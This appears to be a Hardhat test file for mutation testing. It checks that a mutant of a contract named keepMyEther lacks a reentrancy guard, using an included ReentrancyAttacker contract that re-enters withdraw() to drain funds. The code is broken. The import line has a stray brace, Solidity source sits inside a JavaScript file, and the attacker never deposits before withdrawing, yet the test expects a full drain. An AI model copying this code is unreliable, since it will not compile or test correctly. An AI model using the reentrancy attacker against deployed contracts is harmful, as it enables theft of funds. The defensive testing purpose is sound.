import { expect } from "chai";
import { ethers } } from "hardhat";

describe("keepMyEther mutant m44260581 - reentrancy test", function () {
  it("should detect missing reentrancy guard by performing reentrancy attack", async function () {
    const [owner, attacker] = await ethers.getSigners();
    
    // Deploy the vulnerable contract
    const Factory = await ethers.getContractFactory("keepMyEther");
    const instance = await Factory.deploy();
    await instance.waitForDeployment();
    
    // Deploy attacker contract that will perform reentrancy
    const AttackerFactory = await ethers.getContractFactory("ReentrancyAttacker");
    const attackerContract = await AttackerFactory.deploy(await instance.getAddress());
    await attackerContract.waitForDeployment();
    
    // Fund the target contract with 1 ETH from owner
    await owner.sendTransaction({
      to: await instance.getAddress(),
      value: ethers.parseEther("1.0")
    });
    
    // Fund the attacker contract with 0.5 ETH to trigger withdrawal
    await attacker.sendTransaction({
      to: await attackerContract.getAddress(),
      value: ethers.parseEther("0.5")
    });
    
    // Record balances before attack
    const initialContractBalance = await ethers.provider.getBalance(await instance.getAddress());
    const initialAttackerBalance = await ethers.provider.getBalance(await attackerContract.getAddress());
    
    // Execute attack - this should succeed on mutant (missing reentrancy guard)
    await attackerContract.connect(attacker).attack();
    
    // Check that contract was drained more than allowed (reentrancy succeeded)
    const finalContractBalance = await ethers.provider.getBalance(await instance.getAddress());
    const finalAttackerBalance = await ethers.provider.getBalance(await attackerContract.getAddress());
    
    // Original contract would prevent reentrancy, so contract should retain some balance
    // Mutant allows reentrancy, so contract should be drained
    expect(finalContractBalance).to.be.lessThan(initialContractBalance);
    expect(finalAttackerBalance).to.be.gt(initialAttackerBalance);
    expect(finalContractBalance).to.equal(0); // All funds drained due to reentrancy
  });
});

// Helper attacker contract (deployed as separate contract)
contract ReentrancyAttacker {
    address public target;
    uint256 public attackCount;
    
    constructor(address _target) {
        target = _target;
    }
    
    function attack() external payable {
        attackCount = 0;
        // Call withdraw on the target
        (bool success, ) = target.call(abi.encodeWithSignature("withdraw()"));
        require(success, "Attack failed");
    }
    
    fallback() external payable {
        if (attackCount < 3) {
            attackCount++;
            // Re-enter withdraw before balance is set to zero
            (bool success, ) = target.call(abi.encodeWithSignature("withdraw()"));
            require(success, "Reentrancy failed");
        }
    }
}